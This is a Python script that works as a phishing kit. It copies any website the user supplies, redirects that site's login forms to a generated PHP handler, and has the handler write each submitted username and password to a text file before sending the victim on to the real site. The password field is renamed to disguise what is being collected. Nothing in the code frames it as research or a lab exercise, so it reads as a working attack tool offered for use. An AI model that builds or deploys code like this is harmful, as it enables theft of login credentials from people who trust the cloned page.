import os
import webbrowser
import subprocess
from requests_html import HTMLSession
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

def download_resources(soup, base_url, output_folder):
    resources = {
        'css': [],
        'js': [],
        'images': []
    }
    
    for link in soup.find_all('link', {'rel': 'stylesheet'}):
        href = link.get('href')
        if href:
            full_url = urljoin(base_url, href)
            resources['css'].append(full_url)
            link['href'] = os.path.join('css', os.path.basename(href))

    for script in soup.find_all('script'):
        src = script.get('src')
        if src:
            full_url = urljoin(base_url, src)
            resources['js'].append(full_url)
            script['src'] = os.path.join('js', os.path.basename(src))

    for img in soup.find_all('img'):
        src = img.get('src')
        if src:
            full_url = urljoin(base_url, src)
            resources['images'].append(full_url)
            img['src'] = os.path.join('images', os.path.basename(src))
    
    for folder in ['css', 'js', 'images']:
        os.makedirs(os.path.join(output_folder, folder), exist_ok=True)

    return resources

def download_file(url, folder):
    try:
        response = session.get(url)
        if response.status_code == 200:
            file_name = os.path.basename(urlparse(url).path)
            file_path = os.path.join(folder, file_name)
            with open(file_path, 'wb') as f:
                f.write(response.content)
        else:
            print(f"Failed to download {url}")
    except Exception as e:
        print(f"Error downloading {url}: {e}")

def modify_form(soup):
    forms = soup.find_all('form')
    
    if not forms:
        return False, None

    for form in forms:
        form['action'] = 'add_data.php'
        form['method'] = 'post'

        inputs = form.find_all('input')
        for input_field in inputs:
            if input_field['type'] == 'text':
                input_field['name'] = 'name'
            elif input_field['type'] == 'password':
                input_field['name'] = 'age'
                input_field['id'] = 'phone-number'

        form['class'] = form.get('class', []) + ['modified-form']
        for button in form.find_all('button', {'type': 'submit'}):
            button['id'] = 'login-button'
    
    return True, str(soup)

def create_php_files(output_folder, redirect_url):
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    php_content = f"""<?php
$name = $_POST['name'];
$age = $_POST['age'];

$file = fopen('form.txt', 'a');
fwrite($file, "Username: $name\\nPassword: $age\\n");
fclose($file);

header('Location: {redirect_url}');
exit();
?>
"""
    with open(os.path.join(output_folder, 'add_data.php'), 'w', encoding='utf-8') as f:
        f.write(php_content)

    with open(os.path.join(output_folder, 'form.txt'), 'w', encoding='utf-8') as f:
        f.write("")

def start_php_server(output_folder):
    command = ["php", "-S", "localhost:8000", "-t", output_folder]
    subprocess.Popen(command)
    webbrowser.open("http://localhost:8000/index.html")

def process_website():
    global session
    session = HTMLSession()

    while True:
        url = input("Enter the website URL: ")
        try:
            response = session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')

            resources = download_resources(soup, url, 'output_site')

            for res_type, urls in resources.items():
                folder = os.path.join('output_site', res_type)
                for res_url in urls:
                    download_file(res_url, folder)

            found_form, modified_html = modify_form(soup)
            if not found_form:
                print("Form not found! Please enter a different URL.")
            else:
                output_folder = 'output_site'
                if not os.path.exists(output_folder):
                    os.makedirs(output_folder)
                
                with open(os.path.join(output_folder, 'index.html'), 'w', encoding='utf-8') as f:
                    f.write(modified_html)
                
                create_php_files(output_folder, url)
                start_php_server(output_folder)
                break
        except Exception as e:
            print(f"Error loading the website: {e}. Please try again.")

if __name__ == '__main__':
    process_website()
